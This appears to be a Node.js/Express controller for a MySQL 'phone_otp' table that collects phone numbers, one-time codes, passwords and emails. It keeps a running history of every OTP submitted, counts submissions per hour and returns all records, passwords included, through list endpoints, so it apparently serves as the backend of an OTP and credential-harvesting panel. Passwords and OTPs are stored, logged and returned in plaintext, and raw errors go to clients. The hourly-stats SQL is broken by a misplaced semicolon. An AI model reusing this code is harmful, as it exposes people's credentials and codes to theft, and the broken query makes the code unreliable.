const pool = require('../config/db');

const createOrUpdatePhone = async (req, res) => {
  let connection;
  try {
    connection = await pool.getConnection();
    const { phone, otp, status, password, email } = req.body;

    if (!phone) {
      console.log('Phone field is required');
      return res.status(400).json({ message: 'Phone field is required' });
    }

    const [results] = await connection.query('SELECT * FROM phone_otp WHERE phone = ?', [phone]);

    const phoneData = {
      phone,
      otp: otp || null,
      status: status || null,
      password: password || null,
      email: email || null
    };

    if (results.length > 0) {
      const existingOtp = results[0].otp || '';
      const newOtp = existingOtp ? `${existingOtp}|${otp}` : otp;

      const query = 'UPDATE phone_otp SET otp = ?, status = ?, password = ?, email = ? WHERE phone = ?';
      const [updateResult] = await connection.query(query, [newOtp, phoneData.status, phoneData.password, phoneData.email, phone]);

      console.log('Phone updated:', { phone, affectedRows: updateResult.affectedRows });
      res.json({ message: 'Phone updated', affectedRows: updateResult.affectedRows });
    } else {
      const query = 'INSERT INTO phone_otp (phone, otp, status, password, email) VALUES (?, ?, ?, ?, ?)';
      const [insertResult] = await connection.query(query, [phoneData.phone, phoneData.otp, phoneData.status, phoneData.password, phoneData.email]);

      console.log('Phone created:', { id: insertResult.insertId, ...phoneData });
      res.status(201).json({ id: insertResult.insertId, ...phoneData });
    }
  } catch (error) {
    console.log('Server error:', error);
    res.status(500).json({ message: 'Server error', error });
  } finally {
    if (connection) connection.release();
  }
};

const getPhones = async (req, res) => {
  let connection;
  try {
    connection = await pool.getConnection();
    const { page = 1, limit = 10, status, phone, email } = req.query;
    const offset = (page - 1) * limit;

    let query = 'SELECT * FROM phone_otp';
    let params = [];

    if (status) {
      query += ' WHERE status = ?';
      params.push(status);
    }

    if (phone) {
      query += params.length ? ' AND' : ' WHERE';
      query += ' phone = ?';
      params.push(phone);
    }

    if (email) {
      query += params.length ? ' AND' : ' WHERE';
      query += ' email = ?';
      params.push(email);
    }

    query += ' LIMIT ? OFFSET ?';
    params.push(parseInt(limit), parseInt(offset));

    const [results] = await connection.query(query, params);
    console.log('Phones retrieved:', results);
    res.json(results);
  } catch (error) {
    console.log('Server error:', error);
    res.status(500).json({ message: 'Server error', error });
  } finally {
    if (connection) connection.release();
  }
};

const updatePhone = async (req, res) => {
  let connection;
  try {
    connection = await pool.getConnection();
    const { id } = req.params;
    const { phone, otp, status, password, email } = req.body;

    if (!phone) {
      console.log('Phone field is required');
      return res.status(400).json({ message: 'Phone field is required' });
    }

    const [results] = await connection.query('SELECT * FROM phone_otp WHERE id = ?', [id]);

    if (results.length === 0) {
      console.log('Phone not found');
      return res.status(404).json({ message: 'Phone not found' });
    }

    const existingOtp = results[0].otp || '';
    const newOtp = existingOtp ? `${existingOtp}|${otp}` : otp;

    const query = 'UPDATE phone_otp SET phone = ?, otp = ?, status = ?, password = ?, email = ? WHERE id = ?';
    const [updateResult] = await connection.query(query, [phone, newOtp, status, password, email, id]);

    console.log('Phone updated:', { id, affectedRows: updateResult.affectedRows });
    res.json({ message: 'Phone updated', affectedRows: updateResult.affectedRows });
  } catch (error) {
    console.log('Server error:', error);
    res.status(500).json({ message: 'Server error', error });
  } finally {
    if (connection) connection.release();
  }
};

const deletePhone = async (req, res) => {
  let connection;
  try {
    connection = await pool.getConnection();
    const { id } = req.params;

    const query = 'DELETE FROM phone_otp WHERE id = ?';
    const [result] = await connection.query(query, [id]);

    if (result.affectedRows === 0) {
      console.log('Phone not found');
      return res.status(404).json({ message: 'Phone not found' });
    }

    console.log('Phone deleted:', { id });
    res.json({ message: 'Phone deleted', affectedRows: result.affectedRows });
  } catch (error) {
    console.log('Server error:', error);
    res.status(500).json({ message: 'Server error', error });
  } finally {
    if (connection) connection.release();
  }
};

const getRecordsByHour = async (req, res) => {
  let connection;
  try {
    connection = await pool.getConnection();
    const query = `
      SELECT 
        DATE_FORMAT(date, '%Y-%m-%d %H:00:00') AS hour, 
        COUNT(*) AS total_records
      FROM 
        phone_otp 
      WHERE 
        date >= DATE_SUB(NOW(), INTERVAL 2 HOUR) 
      GROUP BY 
        hour 
      ORDER BY 
        hour;

      SELECT 
        COUNT(*) / COUNT(DISTINCT DATE_FORMAT(date, '%Y-%m-%d %H:00:00')) AS average_records_per_hour
      FROM 
        phone_otp;
      WHERE 
        otp IS NOT NULL;
    `;

    const [results] = await connection.query(query);
    const hourlyResults = results[0];
    const averageRecordsPerHour = results[1][0].average_records_per_hour;

    console.log('Records by hour retrieved:', { hourlyResults, averageRecordsPerHour });
    res.json({ hourlyResults, averageRecordsPerHour });
  } catch (error) {
    console.log('Server error:', error);
    res.status(500).json({ message: 'Server error', error });
  } finally {
    if (connection) connection.release();
  }
};

const getPhoneByPhone = async (req, res) => {
  let connection;
  try {
    connection = await pool.getConnection();
    const { phone } = req.params;

    if (!phone) {
      console.log('Phone parameter is required');
      return res.status(400).json({ message: 'Phone parameter is required' });
    }

    const query = 'SELECT * FROM phone_otp WHERE phone = ?';
    const [results] = await connection.query(query, [phone]);

    if (results.length === 0) {
      console.log('Phone not found');
      return res.status(404).json({ message: 'Phone not found' });
    }

    console.log('Phone retrieved:', results[0]);
    res.json(results[0]);
  } catch (error) {
    console.log('Server error:', error);
    res.status(500).json({ message: 'Server error', error });
  } finally {
    if (connection) connection.release();
  }
};

module.exports = { createOrUpdatePhone, getPhones, updatePhone, deletePhone, getRecordsByHour, getPhoneByPhone };
